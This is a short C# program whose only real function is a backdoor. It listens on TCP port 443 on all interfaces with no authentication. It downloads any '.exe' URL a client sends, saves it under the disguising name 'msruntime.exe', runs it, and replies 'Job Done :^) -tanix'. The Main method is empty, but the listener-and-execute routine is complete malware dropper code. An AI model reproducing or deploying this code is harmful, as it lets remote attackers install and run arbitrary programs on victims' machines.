using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace NetFramework
{
    class Program
    {
        static void Main()
        {

        }
        static void Start()
        {
            TcpListener tcpServer = null;
            try
            {
                Int32 port = 443;
                tcpServer = new TcpListener(IPAddress.Any, port);
                tcpServer.Start();

                Byte[] bytes = new Byte[256];
                String data = null;

                while (true)
                {
                    TcpClient tcpClient = tcpServer.AcceptTcpClient();
                    data = null;
                    NetworkStream tcpStream = tcpClient.GetStream();
                    int i;
                    while ((i = tcpStream.Read(bytes, 0, bytes.Length)) != 0)
                    {
                        data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                        // Process the data sent by the client.
                        if (!data.Contains("http:") || !data.Contains(".exe"))
                        {
                            string msgToSend = "Inavlid download link";
                            byte[] msgBytes = System.Text.Encoding.ASCII.GetBytes(msgToSend);
                            tcpStream.Write(msgBytes, 0, msgBytes.Length);
                        }
                        else if (data.Contains("http:") && data.Contains(".exe"))
                        {
                            string url = data;
                            string fileName = "msruntime.exe";
                            using (WebClient theWebClient = new WebClient())
                            {
                                theWebClient.DownloadFile(url, fileName);
                            }
                            Process.Start(fileName);
                            string msgToSend = "Job Done :^) -tanix";
                            byte[] msgBytes = System.Text.Encoding.ASCII.GetBytes(msgToSend);
                            tcpStream.Write(msgBytes, 0, msgBytes.Length);
                        }
                        else
                        {
                            // something isnt right here..........
                        }

                    }
                    tcpClient.Close();
                }
            }
            catch (SocketException e)
            {
            }
            finally
            {
                tcpServer.Stop();
            }
        }
    }

}
